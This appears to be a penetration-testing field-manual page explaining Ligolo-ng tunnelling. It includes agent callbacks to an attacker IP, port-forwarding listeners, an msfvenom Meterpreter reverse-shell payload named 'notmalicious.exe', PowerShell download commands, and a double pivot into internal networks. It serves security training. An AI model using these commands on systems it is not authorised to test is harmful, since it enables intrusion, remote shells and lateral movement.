# Ligolo-ng

> **Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

{% hint style="info" %}
#### Download & Install

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
{% endhint %}

***

## Cheatsheet

TODO

***

## Setup

In order to begin, we need to either download the precompiled binaries or compile the necessary files ourselves. The relevant files can be downloaded from the [releases page](https://github.com/nicocha30/ligolo-ng/releases/) on GitHub.

We’re going to need a **proxy file** which will be the one we use on our attacker machine and agent files for both Linux and Windows so that we have them ready to go depending on what host we compromise.

Download the appropriate proxy file for our attacker machine and architecture and some agent files for Windows x64 and Linux x64 as the most likely possible targets.

***

## Basic Usage

Let’s say we’ve compromised a web server and we see that the server has two network interfaces, one that is public-facing and accessible from our attacker machine and another that lets us access the internal network.

<figure><img src="https://miro.medium.com/v2/resize:fit:614/1*wxQowCJLfTpqBloaVCAavg.png" alt="" height="343" width="614"><figcaption></figcaption></figure>

Of course, we would want that access to the internal network if we prefer to be able to enumerate from our own machine.

{% stepper %}
{% step %}
### Setup Interface

In a terminal on our attack host, navigate to where we saved and extracted the proxy file. We need to run the following commands:

{% code title="Adds a new tun interface to our machine." %}
```bash
sudo ip tuntap add user kali mode tun ligolo
```
{% endcode %}

{% code title="Enables the new interface." %}
```bash
sudo ip link set ligolo up
```
{% endcode %}
{% endstep %}

{% step %}
### Run the Proxy File

We are now ready to run our proxy file.

```bash
./proxy -selfcert
```

{% hint style="success" %}
With the `-selfcert` flag the tool dynamically generates self-signed certificates.
{% endhint %}

Once you run this, the tool will start listening at port `11601` on all interfaces and you will get access to the tool’s command line.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Transfer the Agent

Now we need to transfer the appropriate agent file to the host we’ve compromised using our preferred method of choice. See [file-transfer](../../../field-manual/post-exploitation/file-transfer/ "mention") for more information.
{% endstep %}

{% step %}
### Connection to Attacker Host

Now we can run the following command to connect back to our attacking machine:

```bash
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

{% hint style="info" %}
The `-ignore-cert` ignores certificate validation. This means we won't have any issues with our self-signed certs.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It may take a second for the connection to be established and when it is, we will see that an agent has joined.

{% hint style="info" %}
We can type `help` to access the help menu and check out what options are available.
{% endhint %}
{% endstep %}

{% step %}
### Select the Session

Now we can type `session` in ligolo-ng’s interface, this will list all our sessions and we can specify the one we want either by number or using the arrow keys.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Add Route to Interface

In our scenario, we want to access the `172.16.5.0/24` network, so we need to open a new terminal and add the corresponding route to our ligolo-ng interface with the following command:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

We can confirm that the route has been added by typing ip route list.
{% endstep %}

{% step %}
### Start the Tunnel

Going back to ligolo-ng we can now type `start`which will start a tunnel.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We can now access the network, but in order to catch reverse shells, do file transfers and move further into the network we’re going to have to add some listeners.
{% endstep %}
{% endstepper %}

***

## Reverse Shells

Let’s say that through newly obtained access to the internal network we’ve compromised a Windows host sitting at `172.16.5.35` and we want to catch reverse shell from that host. Here’s how that would go.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*e9dCcfP7674BkFQi3ik55g.png" alt="" height="358" width="700"><figcaption></figcaption></figure>

We can listen to ports on the agent and redirect connections to our attacking machine where we’re running the proxy.

### Create a Listener

We can accomplish this easily by the following command inside the ligolo-ng session:

```bash
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

{% hint style="info" %}
Creates a listener on the target machine where we're running the agent at port `1234` and redirects the traffic to port `4444` on our machine.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

### Payload Creation

In order to catch a reverse shell, the payload needs to be directed to the IP and port of the machine where the listener is created.

Here is a sample payload with msfvenom:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.15 LPORT=1234 -f exe -o notmalicious.exe
```
{% endcode %}

{% hint style="info" %}
IP of the compromised web server and port of the listener we created.
{% endhint %}

Since that traffic is forwarded to port `4444` on our machine we can start up [metasploit](../exploitation-tools/metasploit/ "mention") and listen on that port in order to catch the connection from the shell.

***

## File Transfer

In order to transfer files - it is recommended to - add another listener in order to keep things separate. This is also good in case you have remote code execution and have already used the first listener to catch a PowerShell reverse shell for example.

### Create a Listener

```bash
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
```

{% hint style="info" %}
This command creates a listener on the compromised web server at port `1235` forwarding traffic to port `8000`. In this example, port `8000` is used as it's the default port for a python HTTP server.
{% endhint %}

Use `listener_list` to see all the listeners that have been added.

### Start a Python Server

Now we can start a Python server and pull the file onto the target host.

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest -Uri "http://172.16.5.15:1235/notmalicious.exe" -OutFile notmalicious.exe
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*MRRX5XUHNd0yH9tmyY_kyQ.png" alt="" height="142" width="700"><figcaption></figcaption></figure>

Now with the file transferred over we can run the payload and catch the shell (pay attention to the LHOST).

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*lFvxZY7lCdiX7Ziq83JIpQ.png" alt="" height="259" width="700"><figcaption></figcaption></figure>

***

## Double Pivot

Let’s go deeper into pivoting and keep going with our scenario. Turns out the Windows host we compromised also has two interfaces and we want to move deeper into the network.

### Pass the Agent

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WGCr0zllBWrqpSDYJ9OgbA.png" alt="" height="352" width="700"><figcaption></figcaption></figure>

We’re going to use what we learned about file transfers in order to get the agent.exe file we downloaded earlier onto the host.

```powershell
Invoke-WebRequest -Uri "http://172.16.5.15:1235/agent.exe" -OutFile agent.exe
```

{% hint style="info" %}
In the above command `172.16.5.15:1235` is tunneling back to our attacker host on port `8000`.
{% endhint %}

### Create a Listener

Next we’re going to add a listener on port `11601` in the session we already have running and redirect it to port `11601` on our own machine.

This will allow us to use the agent on the newly compromised host in order to reach back to ligolo-ng and obtain a new session, this time on the Windows host that will let us reach further into the network.

```bash
listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
```

Then we can run the agent on the Windows host with the following command:

```bash
./agent.exe -connect 172.16.5.15:11601 -ignore-cert
```

{% hint style="info" %}
We use the IP of the compromised web server using our newly added listener.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Once again, ligolo-ng will tell us that an agent has joined. We can use the `session` command as before to switch to the new session and then `start` to begin a tunnel over that connection instead.

We’ll get a prompt like this:

```
Tunnel already running, switch from <first agent> to <second agent>? Y/N
```

Once we type `Y`, the new tunnel will start.

We can add the route to the network we want to access as before.

```bash
sudo ip route add 172.16.6.0/24 dev ligolo
```

***

## Resources

[https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
